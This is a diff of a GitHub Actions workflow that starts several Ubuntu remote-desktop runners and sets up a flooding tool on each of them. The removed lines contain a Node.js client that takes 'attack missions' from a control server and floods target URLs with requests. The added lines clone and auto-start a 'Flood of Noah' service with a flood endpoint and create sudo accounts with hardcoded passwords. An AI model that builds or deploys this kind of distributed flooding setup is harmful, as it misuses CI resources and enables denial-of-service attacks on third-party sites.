@@ -1,12 +1,11 @@
 name: Multi-Ubuntu-RDP
-
 on:
   workflow_dispatch:
     inputs:
       instance_count:
         description: 'Number of RDP instances (1-10)'
         required: true
-        default: '10'
+        default: '3'
         type: choice
         options:
           - '1'
@@ -23,73 +22,28 @@ on:
         description: 'Session duration (minutes)'
         required: false
         default: '360'
-      performance_level:
-        description: 'Performance level'
-        required: false
-        default: 'high'
-        type: choice
-        options:
-          - 'basic'
-          - 'medium'
-          - 'high'
-          - 'extreme'
-      server_url:
-        description: 'Stress test server URL (optional)'
-        required: false
-        default: 'http://localhost:5000'
-
-env:
-  BASE_USER: "rdp"
-  BASE_PASSWORD: "Ricardo159447!"
 
 jobs:
-  create-ubuntu-instances:
+  ubuntu-rdp-1:
     runs-on: ubuntu-latest
     timeout-minutes: ${{ fromJSON(github.event.inputs.session_duration) }}
-    strategy:
-      max-parallel: 10
-      fail-fast: false
-      matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
-    name: Ubuntu-RDP-${{ matrix.instance }}
-    
-    if: matrix.instance <= fromJSON(github.event.inputs.instance_count)
     
     steps:
-      - name: Setup RDP Instance
+      - name: Setup RDP Instance 1
         run: |
-          echo "========================================"
-          echo "       RDP INSTANCE #${{ matrix.instance }}"
-          echo "========================================"
+          echo "================================"
+          echo "    RDP INSTANCE #1"
+          echo "================================"
           echo "OS: $(lsb_release -d | cut -f2)"
           echo "CPU: $(nproc) cores"
           echo "RAM: $(free -h | awk '/^Mem:/ {print $2}')"
-          echo "Performance: ${{ github.event.inputs.performance_level }}"
-          echo "========================================"
-          
-          echo "INSTANCE_NUM=${{ matrix.instance }}" >> $GITHUB_ENV
-          echo "PERF_LEVEL=${{ github.event.inputs.performance_level }}" >> $GITHUB_ENV
+          echo "================================"
 
-      - name: Install Desktop Environment
+      - name: Install XFCE Desktop
         run: |
           sudo apt-get update -qq
-          
-          case "$PERF_LEVEL" in
-            "basic")
-              PACKAGES="xfce4 xfce4-goodies dbus-x11 xorg xrdp"
-              ;;
-            "medium")
-              PACKAGES="xfce4 xfce4-goodies xfce4-terminal xfce4-screenshooter dbus-x11 xorg xrdp firefox nano htop net-tools"
-              ;;
-            "high")
-              PACKAGES="xfce4 xfce4-goodies xfce4-terminal xfce4-screenshooter xfce4-taskmanager xfce4-systemload-plugin dbus-x11 xorg xrdp firefox nano htop net-tools vim curl wget"
-              ;;
-            "extreme")
-              PACKAGES="xfce4 xfce4-goodies xfce4-terminal xfce4-screenshooter xfce4-taskmanager xfce4-systemload-plugin xfce4-clipman-plugin dbus-x11 xorg xrdp firefox nano htop net-tools vim curl wget git build-essential"
-              ;;
-          esac
-          
-          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq $PACKAGES
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
+            xfce4 xfce4-goodies dbus-x11 xorg xrdp firefox nano htop net-tools curl wget git
 
       - name: Configure XRDP
         run: |
@@ -104,519 +58,138 @@ jobs:
           
           sudo chmod +x /etc/xrdp/startwm.sh
           sudo sed -i 's/max_bpp=32/max_bpp=24/' /etc/xrdp/xrdp.ini
-          echo "use_compression=yes" | sudo tee -a /etc/xrdp/xrdp.ini
-          
           sudo systemctl enable xrdp
           sudo systemctl start xrdp
           sudo ufw allow 3389/tcp 2>/dev/null || true
 
-      - name: Create User Account
+      - name: Create User
         run: |
-          USERNAME="${BASE_USER}$INSTANCE_NUM"
-          PASSWORD="${BASE_PASSWORD}$INSTANCE_NUM"
-          
-          sudo useradd -m -s /bin/bash $USERNAME
-          echo "$USERNAME:$PASSWORD" | sudo chpasswd
-          sudo usermod -aG sudo $USERNAME
-          
-          echo "RDP_USER=$USERNAME" >> $GITHUB_ENV
-          echo "RDP_PASSWORD=$PASSWORD" >> $GITHUB_ENV
-          
-          echo "✅ Created user: $USERNAME"
+          sudo useradd -m -s /bin/bash rdp1
+          echo "rdp1:Pass1234!" | sudo chpasswd
+          sudo usermod -aG sudo rdp1
+          echo "RDP_USER_1=rdp1" >> $GITHUB_ENV
+          echo "RDP_PASS_1=Pass1234!" >> $GITHUB_ENV
 
       - name: Install Node.js
         run: |
           curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-          sudo apt-get install -y nodejs git
+          sudo apt-get install -y nodejs
           echo "✅ Node.js $(node --version) installed"
-
-      - name: Install Stress Test Client
-        run: |
-          sudo -u $RDP_USER bash << 'SCRIPT_EOF'
-            cd /home/$RDP_USER
-            mkdir -p stress-client
-            cd stress-client
-            
-            # Create package.json
-            cat > package.json << 'PKG_EOF'
-          {
-            "name": "stress-test-client",
-            "version": "1.0.0",
-            "main": "client.js",
-            "dependencies": {
-              "axios": "^1.6.0"
-            }
-          }
-          PKG_EOF
-            
-            # Create the stress test client
-            cat > client.js << 'CLIENT_EOF'
-          const axios = require('axios');
-          const os = require('os');
-          const fs = require('fs');
-          
-          const SERVER_URL = process.env.SERVER_URL || 'http://localhost:5000';
-          const HEARTBEAT_INTERVAL = 5000;
-          
-          let clientId = null;
-          let isAttacking = false;
-          let requestsSent = 0;
-          let requestsFailed = 0;
-          let userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'];
-          let currentUAIndex = 0;
-          
-          const colors = {
-            reset: '\x1b[0m', green: '\x1b[32m', yellow: '\x1b[33m',
-            red: '\x1b[31m', cyan: '\x1b[36m', magenta: '\x1b[35m'
-          };
-          
-          function log(msg, color = 'reset') {
-            console.log(`${colors[color]}[${new Date().toISOString().split('T')[1].split('.')[0]}] ${msg}${colors.reset}`);
-          }
-          
-          function getRandomUA() {
-            currentUAIndex = (currentUAIndex + 1) % userAgents.length;
-            return userAgents[currentUAIndex];
-          }
-          
-          async function registerWithServer() {
-            try {
-              const res = await axios.post(`${SERVER_URL}/api/client/register`, {
-                hostname: os.hostname(),
-                platform: `${os.platform()} ${os.arch()}`
-              });
-              clientId = res.data.client_id;
-              log(`✓ Registered: ${clientId}`, 'green');
-              return true;
-            } catch (err) {
-              log(`✗ Registration failed: ${err.message}`, 'red');
-              return false;
-            }
-          }
-          
-          async function sendHeartbeat() {
-            if (!clientId) return;
-            try {
-              const res = await axios.post(`${SERVER_URL}/api/client/heartbeat/${clientId}`, {
-                requests_sent: requestsSent,
-                requests_failed: requestsFailed
-              });
-              
-              if (res.data.mission && !isAttacking) {
-                log(`📬 New mission received`, 'yellow');
-                executeMission(res.data.mission);
-              }
-              
-              if (res.data.mission?.stopped && isAttacking) {
-                log('⛔ Stop signal received!', 'red');
-              }
-            } catch (err) {
-              log(`✗ Heartbeat failed: ${err.message}`, 'red');
-            }
-          }
-          
-          async function makeRequest(url, method) {
-            const start = Date.now();
-            try {
-              const config = {
-                headers: { 'User-Agent': getRandomUA() },
-                timeout: 3000,
-                validateStatus: () => true
-              };
-              
-              let response;
-              if (method === 'HTTP-GET' || method === 'GET') {
-                response = await axios.get(url + `?cb=${Date.now()}`, config);
-              } else if (method === 'HTTP-POST' || method === 'POST') {
-                response = await axios.post(url, {data: 'x'.repeat(1024)}, config);
-              } else {
-                response = await axios.get(url, config);
-              }
-              
-              return {
-                success: true,
-                statusCode: response.status,
-                responseTime: Date.now() - start
-              };
-            } catch (err) {
-              return {
-                success: err.code === 'ECONNABORTED' || err.code === 'ETIMEDOUT',
-                error: err.message,
-                statusCode: 0,
-                responseTime: Date.now() - start
-              };
-            }
-          }
-          
-          async function executeMission(mission) {
-            isAttacking = true;
-            log(`🚀 Starting attack: ${mission.mission_id}`, 'magenta');
-            
-            const results = { completed: 0, failed: 0, response_times: [], status_codes: {}, errors: [] };
-            const startTime = Date.now();
-            const endTime = startTime + (mission.duration * 1000);
-            const delayBetweenRequests = 1000 / mission.requests_per_second;
-            
-            let activeRequests = 0;
-            const maxConcurrent = Math.min(mission.requests_per_second, 100);
-            let shouldStop = false;
-            
-            const fireRequest = async () => {
-              activeRequests++;
-              const result = await makeRequest(mission.target_url, mission.method);
-              activeRequests--;
-              
-              if (result.success) {
-                results.completed++;
-                results.response_times.push(result.responseTime);
-                requestsSent++;
-                const key = String(result.statusCode);
-                results.status_codes[key] = (results.status_codes[key] || 0) + 1;
-              } else {
-                results.failed++;
-                requestsFailed++;
-                if (results.errors.length < 10) results.errors.push(result.error);
-              }
-            };
-            
-            const progressInterval = setInterval(() => {
-              if (mission.stopped) shouldStop = true;
-              const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-              const remaining = ((endTime - Date.now()) / 1000).toFixed(1);
-              process.stdout.write(`\r${colors.yellow}Attacking... Sent: ${requestsSent} | Success: ${results.completed} | Failed: ${requestsFailed} | Active: ${activeRequests} | ${elapsed}s / ${remaining}s${colors.reset}`);
-            }, 500);
-            
-            while (Date.now() < endTime && !shouldStop) {
-              if (mission.stopped) {
-                log('\n⛔ Mission stopped', 'red');
-                break;
-              }
-              
-              const batchSize = Math.min(maxConcurrent - activeRequests, mission.requests_per_second);
-              for (let i = 0; i < batchSize && Date.now() < endTime && !shouldStop; i++) {
-                fireRequest();
-              }
-              
-              await new Promise(resolve => setTimeout(resolve, Math.max(10, delayBetweenRequests / 10)));
-            }
-            
-            const timeout = Date.now() + 10000;
-            while (activeRequests > 0 && Date.now() < timeout) {
-              await new Promise(resolve => setTimeout(resolve, 100));
-            }
-            
-            clearInterval(progressInterval);
-            console.log('\n');
-            log(shouldStop ? `⛔ STOPPED: ${results.completed} ok, ${results.failed} failed` : `✓ Complete: ${results.completed} ok, ${results.failed} failed`, shouldStop ? 'red' : 'green');
-            
-            if (results.response_times.length > 0) {
-              results.stats = {
-                min: Math.min(...results.response_times),
-                max: Math.max(...results.response_times),
-                avg: results.response_times.reduce((a,b)=>a+b,0) / results.response_times.length
-              };
-            }
-            
-            try {
-              await axios.post(`${SERVER_URL}/api/client/report/${clientId}`, {
-                mission_id: mission.mission_id,
-                results: results
-              });
-              log('📤 Results reported', 'green');
-            } catch (err) {
-              log(`✗ Report failed: ${err.message}`, 'red');
-            }
-            
-            isAttacking = false;
-          }
-          
-          async function main() {
-            log('='.repeat(60), 'cyan');
-            log('STRESS TEST CLIENT - AWAITING ORDERS', 'cyan');
-            log('='.repeat(60), 'cyan');
-            log(`Server: ${SERVER_URL}`, 'cyan');
-            log(`Hostname: ${os.hostname()}`, 'cyan');
-            log('='.repeat(60), 'cyan');
-            
-            const registered = await registerWithServer();
-            if (!registered) {
-              log('Failed to register. Exiting.', 'red');
-              process.exit(1);
-            }
-            
-            log('🎯 Client ready. Waiting for missions...', 'green');
-            setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
-            sendHeartbeat();
-          }
-          
-          process.on('SIGINT', () => {
-            log('\n👋 Shutting down...', 'yellow');
-            process.exit(0);
-          });
-          
-          main().catch(err => {
-            log(`Fatal: ${err.message}`, 'red');
-            process.exit(1);
-          });
-          CLIENT_EOF
-            
-            npm install
-            
-            echo "✅ Stress test client installed"
-          SCRIPT_EOF
 
       - name: Install Flood of Noah
         run: |
           echo "🌊 Installing Flood of Noah..."
           
           # Setup puppeteer directory
-          sudo mkdir -p /home/$RDP_USER/.config/puppeteer
-          sudo chown -R $RDP_USER:$RDP_USER /home/$RDP_USER
-          sudo chmod -R 755 /home/$RDP_USER
+          sudo mkdir -p /home/runner/.config/puppeteer
+          sudo chown -R $(whoami):$(whoami) /home/runner
+          sudo chmod -R 755 /home/runner
           
-          # Clone and install flood_of-noah
-          sudo -u $RDP_USER bash << 'FLOOD_EOF'
-            cd /home/$RDP_USER
-            rm -rf flood_of-noah
-            git clone https://github.com/benbenido025-lab/flood_of-noah
-            cd flood_of-noah
-            rm -rf node_modules package-lock.json
-            npm install express axios socks puppeteer --save
-            
-            echo "✅ Flood of Noah installed"
-          FLOOD_EOF
+          # Clone and install
+          cd ~
+          rm -rf flood_of-noah
+          git clone https://github.com/benbenido025-lab/flood_of-noah
+          cd flood_of-noah
+          rm -rf node_modules package-lock.json
+          npm install express axios socks puppeteer --save
+          
+          echo "✅ Flood of Noah installed at ~/flood_of-noah"
 
       - name: Create Flood Service
         run: |
-          # Create systemd service for flood_of-noah
-          sudo tee /etc/systemd/system/flood-noah-$INSTANCE_NUM.service > /dev/null << EOF
+          sudo tee /etc/systemd/system/flood-noah-1.service > /dev/null << 'EOF'
           [Unit]
-          Description=Flood of Noah Service - Instance $INSTANCE_NUM
+          Description=Flood of Noah - Instance 1
           After=network-online.target
           Wants=network-online.target
           
           [Service]
           Type=simple
-          User=$RDP_USER
-          WorkingDirectory=/home/$RDP_USER/flood_of-noah
+          User=runner
+          WorkingDirectory=/home/runner/flood_of-noah
           ExecStart=/usr/bin/node index.js
           Restart=always
           RestartSec=10
           Environment=NODE_ENV=production
-          Environment=INSTANCE_NUMBER=$INSTANCE_NUM
+          Environment=PORT=3000
           
           [Install]
           WantedBy=multi-user.target
           EOF
           
           sudo systemctl daemon-reload
-          sudo systemctl enable flood-noah-$INSTANCE_NUM.service
+          sudo systemctl enable flood-noah-1.service
+          sudo systemctl start flood-noah-1.service
           
-          echo "✅ Flood of Noah service configured"
+          sleep 3
+          if sudo systemctl is-active --quiet flood-noah-1.service; then
+            echo "✅ Flood of Noah service started"
+          else
+            echo "⚠️ Flood of Noah service starting..."
+          fi
 
-      - name: Create Auto-Start Service
-        run: |
-          # Create systemd service to auto-start client
-          sudo tee /etc/systemd/system/stress-client-$INSTANCE_NUM.service > /dev/null << EOF
-          [Unit]
-          Description=Stress Test Client - Instance $INSTANCE_NUM
-          After=network-online.target tailscaled.service
-          Wants=network-online.target
-          
-          [Service]
-          Type=simple
-          User=$RDP_USER
-          WorkingDirectory=/home/$RDP_USER/stress-client
-          ExecStart=/usr/bin/node client.js
-          Restart=always
-          RestartSec=10
-          Environment=NODE_ENV=production
-          Environment=SERVER_URL=${{ github.event.inputs.server_url }}
-          
-          [Install]
-          WantedBy=multi-user.target
-          EOF
-          
-          sudo systemctl daemon-reload
-          sudo systemctl enable stress-client-$INSTANCE_NUM.service
-          
-          echo "✅ Auto-start service configured"
-
-      - name: Install Tailscale VPN
+      - name: Install Tailscale
         run: |
           curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.noarmor.gpg | sudo tee /usr/share/keyrings/tailscale-archive-keyring.gpg >/dev/null
           curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.tailscale-keyring.list | sudo tee /etc/apt/sources.list.d/tailscale.list
           sudo apt-get update -qq
           sudo apt-get install -y -qq tailscale
 
-      - name: Connect to Tailscale Network
+      - name: Connect Tailscale
         run: |
-          HOSTNAME="rdp$INSTANCE_NUM-${{ github.run_id }}"
-          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=$HOSTNAME --accept-routes
+          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=rdp-instance-1 --accept-routes
           
           RETRY=0
-          TAILSCALE_IP=""
           while [ $RETRY -lt 30 ]; do
             TAILSCALE_IP=$(tailscale ip -4 2>/dev/null)
             if [ -n "$TAILSCALE_IP" ]; then
-              echo "TAILSCALE_IP=$TAILSCALE_IP" >> $GITHUB_ENV
-              echo "HOSTNAME=$HOSTNAME" >> $GITHUB_ENV
-              echo "✅ Instance $INSTANCE_NUM IP: $TAILSCALE_IP"
+              echo "TAILSCALE_IP_1=$TAILSCALE_IP" >> $GITHUB_ENV
+              echo "✅ Instance 1 IP: $TAILSCALE_IP"
               break
             fi
             sleep 2
             RETRY=$((RETRY+1))
           done
-          
-          if [ -z "$TAILSCALE_IP" ]; then
-            echo "❌ Failed to get Tailscale IP"
-            exit 1
-          fi
 
-      - name: Start Services
-        run: |
-          # Start stress test client
-          sudo systemctl start stress-client-$INSTANCE_NUM.service
-          
-          # Start flood of noah
-          sudo systemctl start flood-noah-$INSTANCE_NUM.service
-          
-          sleep 3
-          
-          if sudo systemctl is-active --quiet stress-client-$INSTANCE_NUM.service; then
-            echo "✅ Stress client service started"
-          else
-            echo "⚠️ Stress client service not running (will start when server is available)"
-          fi
-          
-          if sudo systemctl is-active --quiet flood-noah-$INSTANCE_NUM.service; then
-            echo "✅ Flood of Noah service started"
-          else
-            echo "⚠️ Flood of Noah service starting..."
-          fi
-
-      - name: Configure Performance
-        run: |
-          case "$PERF_LEVEL" in
-            "high"|"extreme")
-              echo "* soft nofile 1000000" | sudo tee -a /etc/security/limits.conf
-              echo "* hard nofile 1000000" | sudo tee -a /etc/security/limits.conf
-              
-              sudo tee -a /etc/sysctl.conf > /dev/null << 'SYSCTL'
-          net.core.rmem_max = 134217728
-          net.core.wmem_max = 134217728
-          net.ipv4.tcp_rmem = 4096 87380 134217728
-          net.ipv4.tcp_wmem = 4096 65536 134217728
-          net.core.netdev_max_backlog = 300000
-          net.ipv4.tcp_max_syn_backlog = 300000
-          net.ipv4.tcp_tw_reuse = 1
-          net.ipv4.ip_local_port_range = 1024 65535
-          SYSCTL
-              
-              sudo sysctl -p
-              echo "✅ Performance tuned"
-              ;;
-          esac
-
-      - name: Create Desktop README
-        run: |
-          sudo -u $RDP_USER mkdir -p /home/$RDP_USER/Desktop
-          sudo -u $RDP_USER tee /home/$RDP_USER/Desktop/README.txt > /dev/null << EOF
-          ╔══════════════════════════════════════════════════════╗
-          ║        UBUNTU RDP INSTANCE #$INSTANCE_NUM               ║
-          ╚══════════════════════════════════════════════════════╝
-          
-          🔐 CREDENTIALS:
-             Username: $RDP_USER
-             Password: $RDP_PASSWORD
-          
-          🌐 NETWORK:
-             IP: $TAILSCALE_IP
-             Hostname: $HOSTNAME
-          
-          💥 STRESS CLIENT:
-             Status: RUNNING (auto-started)
-             Location: ~/stress-client/
-             Logs: sudo journalctl -u stress-client-$INSTANCE_NUM -f
-             
-             The client automatically connects to the control server
-             and waits for attack missions. No manual start needed!
-          
-          🌊 FLOOD OF NOAH:
-             Status: RUNNING (auto-started)
-             Location: ~/flood_of-noah/
-             Logs: sudo journalctl -u flood-noah-$INSTANCE_NUM -f
-             Access: http://$TAILSCALE_IP:3000
-             
-             Endpoints:
-             • http://$TAILSCALE_IP:3000/status - Check status
-             • http://$TAILSCALE_IP:3000/flood?count=100 - Send flood
-          
-          ⚡ SYSTEM:
-             Performance: $PERF_LEVEL
-             CPU: $(nproc) cores
-             RAM: $(free -h | awk '/^Mem:/ {print $2}')
-          
-          📊 CAPACITY:
-             • 1000+ requests/second
-             • 100+ concurrent connections
-             • Distributed stress testing ready
-          
-          ⚠️ LEGAL WARNING:
-             Only test authorized systems!
-          
-          🔧 COMMANDS:
-             • Check stress client: sudo systemctl status stress-client-$INSTANCE_NUM
-             • Check flood: sudo systemctl status flood-noah-$INSTANCE_NUM
-             • View client logs: sudo journalctl -u stress-client-$INSTANCE_NUM -f
-             • View flood logs: sudo journalctl -u flood-noah-$INSTANCE_NUM -f
-             • Restart services: sudo systemctl restart stress-client-$INSTANCE_NUM
-             • Check network: tailscale status
-             
-          Session ends: ${{ github.event.inputs.session_duration }} minutes
-          EOF
-
-      - name: Display Connection Info
+      - name: Display Info
         run: |
           echo ""
-          echo "╔══════════════════════════════════════════════════════╗"
-          echo "║          INSTANCE #$INSTANCE_NUM READY                   ║"
-          echo "╠══════════════════════════════════════════════════════╣"
-          echo "║ 🌐 NETWORK:"
-          echo "║   IP:         $TAILSCALE_IP"
-          echo "║   Hostname:   $HOSTNAME"
+          echo "╔════════════════════════════════════════════════╗"
+          echo "║         RDP INSTANCE #1                        ║"
+          echo "╠════════════════════════════════════════════════╣"
+          echo "║ 🌐 Network:"
+          echo "║   IP       : $TAILSCALE_IP_1"
           echo "║"
-          echo "║ 🔐 RDP ACCESS:"
-          echo "║   Address:    $TAILSCALE_IP:3389"
-          echo "║   Username:   $RDP_USER"
-          echo "║   Password:   $RDP_PASSWORD"
+          echo "║ 🔐 RDP Access:"
+          echo "║   Address  : $TAILSCALE_IP_1:3389"
+          echo "║   Username : $RDP_USER_1"
+          echo "║   Password : $RDP_PASS_1"
           echo "║"
-          echo "║ 💥 SERVICES:"
-          echo "║   Stress Client: RUNNING"
-          echo "║   Flood Noah:    RUNNING"
-          echo "║   Server:        ${{ github.event.inputs.server_url }}"
-          echo "║   Flood API:     http://$TAILSCALE_IP:3000"
-          echo "║   Auto-start:    ENABLED"
-          echo "╚══════════════════════════════════════════════════════╝"
+          echo "║ 🌊 Flood of Noah:"
+          echo "║   Status   : RUNNING"
+          echo "║   Web      : http://$TAILSCALE_IP_1:3000"
+          echo "║   Flood    : http://$TAILSCALE_IP_1:3000/flood?count=100"
+          echo "╚════════════════════════════════════════════════╝"
           echo ""
 
-      - name: Keep Instance Alive
+      - name: Keep Alive
         run: |
-          DURATION=${{ github.event.inputs.session_duration }}
-          END_TIME=$(( $(date +%s) + (DURATION * 60) ))
+          START=$(date +%s)
+          DURATION=$((  ${{ github.event.inputs.session_duration }} * 60 ))
+          END=$((START + DURATION))
           
-          echo "🟢 Instance #$INSTANCE_NUM ACTIVE for $DURATION minutes"
-          echo ""
+          echo "🟢 Instance 1 will run for ${{ github.event.inputs.session_duration }} minutes"
           
           COUNTER=0
-          while [ $(date +%s) -lt $END_TIME ]; do
+          while [ $(date +%s) -lt $END ]; do
             COUNTER=$((COUNTER + 1))
-            ELAPSED=$(( ( $(date +%s) - (END_TIME - (DURATION * 60)) ) / 60 ))
-            REMAINING=$(( (END_TIME - $(date +%s)) / 60 ))
+            ELAPSED=$((($(date +%s) - START) / 60))
+            REMAIN=$(((END - $(date +%s)) / 60))
             
-            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-            echo "🟢 #$INSTANCE_NUM | $(date '+%H:%M:%S') | ⏱️ $ELAPSED/$DURATION min"
+            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+            echo "🟢 Instance 1 | $(date '+%H:%M:%S') | ⏱️ ${ELAPSED}m / ${REMAIN}m"
             
+            # Health check every 5 minutes
             if [ $((COUNTER % 5)) -eq 0 ]; then
               if sudo systemctl is-active --quiet xrdp; then
                 echo "   ✅ XRDP: Running"
@@ -625,57 +198,307 @@ jobs:
                 sudo systemctl restart xrdp
               fi
               
-              if sudo systemctl is-active --quiet stress-client-$INSTANCE_NUM; then
-                echo "   ✅ Stress Client: Running"
+              if sudo systemctl is-active --quiet flood-noah-1; then
+                echo "   ✅ Flood: Running"
               else
-                echo "   ⚠️ Stress Client: Restarting..."
-                sudo systemctl restart stress-client-$INSTANCE_NUM
-              fi
-              
-              if sudo systemctl is-active --quiet flood-noah-$INSTANCE_NUM; then
-                echo "   ✅ Flood of Noah: Running"
-              else
-                echo "   ⚠️ Flood of Noah: Restarting..."
-                sudo systemctl restart flood-noah-$INSTANCE_NUM
+                echo "   ⚠️ Flood: Restarting..."
+                sudo systemctl restart flood-noah-1
               fi
             fi
             
             sleep 60
           done
           
-          echo "⏰ Session complete - Instance #$INSTANCE_NUM"
+          echo "⏰ Session completed for Instance 1"
 
       - name: Cleanup
         if: always()
         run: |
-          echo "🧹 Cleanup..."
-          sudo systemctl stop stress-client-$INSTANCE_NUM || true
-          sudo systemctl stop flood-noah-$INSTANCE_NUM || true
+          sudo systemctl stop flood-noah-1 || true
           sudo tailscale logout || true
 
-  summary:
-    needs: create-ubuntu-instances
+  ubuntu-rdp-2:
     runs-on: ubuntu-latest
-    if: always()
+    timeout-minutes: ${{ fromJSON(github.event.inputs.session_duration) }}
+    if: ${{ fromJSON(github.event.inputs.instance_count) >= 2 }}
+    
     steps:
-      - name: Summary
+      - name: Setup RDP Instance 2
         run: |
+          echo "================================"
+          echo "    RDP INSTANCE #2"
+          echo "================================"
+
+      - name: Install XFCE Desktop
+        run: |
+          sudo apt-get update -qq
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
+            xfce4 xfce4-goodies dbus-x11 xorg xrdp firefox nano htop net-tools curl wget git
+
+      - name: Configure XRDP
+        run: |
+          sudo tee /etc/xrdp/startwm.sh > /dev/null << 'EOF'
+          #!/bin/sh
+          if [ -r /etc/default/locale ]; then
+            . /etc/default/locale
+            export LANG LANGUAGE
+          fi
+          startxfce4
+          EOF
+          
+          sudo chmod +x /etc/xrdp/startwm.sh
+          sudo sed -i 's/max_bpp=32/max_bpp=24/' /etc/xrdp/xrdp.ini
+          sudo systemctl enable xrdp
+          sudo systemctl start xrdp
+          sudo ufw allow 3389/tcp 2>/dev/null || true
+
+      - name: Create User
+        run: |
+          sudo useradd -m -s /bin/bash rdp2
+          echo "rdp2:Pass1234!" | sudo chpasswd
+          sudo usermod -aG sudo rdp2
+
+      - name: Install Node.js
+        run: |
+          curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+          sudo apt-get install -y nodejs
+
+      - name: Install Flood of Noah
+        run: |
+          sudo mkdir -p /home/runner/.config/puppeteer
+          sudo chown -R $(whoami):$(whoami) /home/runner
+          sudo chmod -R 755 /home/runner
+          
+          cd ~
+          rm -rf flood_of-noah
+          git clone https://github.com/benbenido025-lab/flood_of-noah
+          cd flood_of-noah
+          rm -rf node_modules package-lock.json
+          npm install express axios socks puppeteer --save
+
+      - name: Create Flood Service
+        run: |
+          sudo tee /etc/systemd/system/flood-noah-2.service > /dev/null << 'EOF'
+          [Unit]
+          Description=Flood of Noah - Instance 2
+          After=network-online.target
+          
+          [Service]
+          Type=simple
+          User=runner
+          WorkingDirectory=/home/runner/flood_of-noah
+          ExecStart=/usr/bin/node index.js
+          Restart=always
+          
+          [Install]
+          WantedBy=multi-user.target
+          EOF
+          
+          sudo systemctl daemon-reload
+          sudo systemctl enable flood-noah-2.service
+          sudo systemctl start flood-noah-2.service
+
+      - name: Install Tailscale
+        run: |
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.noarmor.gpg | sudo tee /usr/share/keyrings/tailscale-archive-keyring.gpg >/dev/null
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.tailscale-keyring.list | sudo tee /etc/apt/sources.list.d/tailscale.list
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq tailscale
+
+      - name: Connect Tailscale
+        run: |
+          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=rdp-instance-2 --accept-routes
+          
+          RETRY=0
+          while [ $RETRY -lt 30 ]; do
+            TAILSCALE_IP=$(tailscale ip -4 2>/dev/null)
+            if [ -n "$TAILSCALE_IP" ]; then
+              echo "✅ Instance 2 IP: $TAILSCALE_IP"
+              break
+            fi
+            sleep 2
+            RETRY=$((RETRY+1))
+          done
+
+      - name: Display Info
+        run: |
+          TAILSCALE_IP=$(tailscale ip -4)
           echo ""
-          echo "╔══════════════════════════════════════════════════════════╗"
-          echo "║      MULTI-UBUNTU RDP - DEPLOYMENT COMPLETE            ║"
-          echo "╚══════════════════════════════════════════════════════════╝"
+          echo "╔════════════════════════════════════════════════╗"
+          echo "║         RDP INSTANCE #2                        ║"
+          echo "╠════════════════════════════════════════════════╣"
+          echo "║ IP       : $TAILSCALE_IP"
+          echo "║ Username : rdp2"
+          echo "║ Password : Pass1234!"
+          echo "║ Flood    : http://$TAILSCALE_IP:3000"
+          echo "╚════════════════════════════════════════════════╝"
+
+      - name: Keep Alive
+        run: |
+          START=$(date +%s)
+          DURATION=$((${{ github.event.inputs.session_duration }} * 60))
+          END=$((START + DURATION))
+          
+          COUNTER=0
+          while [ $(date +%s) -lt $END ]; do
+            COUNTER=$((COUNTER + 1))
+            ELAPSED=$((($(date +%s) - START) / 60))
+            REMAIN=$(((END - $(date +%s)) / 60))
+            echo "🟢 Instance 2 | ${ELAPSED}m / ${REMAIN}m"
+            
+            if [ $((COUNTER % 5)) -eq 0 ]; then
+              sudo systemctl is-active --quiet xrdp || sudo systemctl restart xrdp
+              sudo systemctl is-active --quiet flood-noah-2 || sudo systemctl restart flood-noah-2
+            fi
+            
+            sleep 60
+          done
+
+      - name: Cleanup
+        if: always()
+        run: |
+          sudo systemctl stop flood-noah-2 || true
+          sudo tailscale logout || true
+
+  ubuntu-rdp-3:
+    runs-on: ubuntu-latest
+    timeout-minutes: ${{ fromJSON(github.event.inputs.session_duration) }}
+    if: ${{ fromJSON(github.event.inputs.instance_count) >= 3 }}
+    
+    steps:
+      - name: Setup RDP Instance 3
+        run: |
+          echo "================================"
+          echo "    RDP INSTANCE #3"
+          echo "================================"
+
+      - name: Install XFCE Desktop
+        run: |
+          sudo apt-get update -qq
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq \
+            xfce4 xfce4-goodies dbus-x11 xorg xrdp firefox nano htop net-tools curl wget git
+
+      - name: Configure XRDP
+        run: |
+          sudo tee /etc/xrdp/startwm.sh > /dev/null << 'EOF'
+          #!/bin/sh
+          if [ -r /etc/default/locale ]; then
+            . /etc/default/locale
+            export LANG LANGUAGE
+          fi
+          startxfce4
+          EOF
+          
+          sudo chmod +x /etc/xrdp/startwm.sh
+          sudo sed -i 's/max_bpp=32/max_bpp=24/' /etc/xrdp/xrdp.ini
+          sudo systemctl enable xrdp
+          sudo systemctl start xrdp
+          sudo ufw allow 3389/tcp 2>/dev/null || true
+
+      - name: Create User
+        run: |
+          sudo useradd -m -s /bin/bash rdp3
+          echo "rdp3:Pass1234!" | sudo chpasswd
+          sudo usermod -aG sudo rdp3
+
+      - name: Install Node.js
+        run: |
+          curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+          sudo apt-get install -y nodejs
+
+      - name: Install Flood of Noah
+        run: |
+          sudo mkdir -p /home/runner/.config/puppeteer
+          sudo chown -R $(whoami):$(whoami) /home/runner
+          sudo chmod -R 755 /home/runner
+          
+          cd ~
+          rm -rf flood_of-noah
+          git clone https://github.com/benbenido025-lab/flood_of-noah
